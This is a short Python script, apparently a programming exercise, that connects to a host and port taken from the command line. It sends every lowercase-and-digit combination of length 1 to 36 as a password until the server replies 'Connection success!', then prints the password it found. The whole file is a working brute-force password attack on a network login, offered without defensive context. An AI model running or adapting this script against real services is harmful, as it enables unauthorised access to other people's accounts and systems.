import socket
import sys
import itertools
from string import ascii_lowercase, digits

with socket.socket() as cs:
    hostname = sys.argv[1]
    port = int(sys.argv[2])

    address = (hostname, port)
    cs.connect(address)

    chars = ascii_lowercase + digits
    found = False

    for i in range(1, 37):
        if found:
            break
        combos = itertools.product(chars, repeat=i)
        for combo in combos:
            pw = ''.join(combo)
            pw = pw.encode()

            cs.send(pw)

            response = cs.recv(1024)

            if 'Connection success!' in response.decode():
                print(pw.decode())
                found = True
                break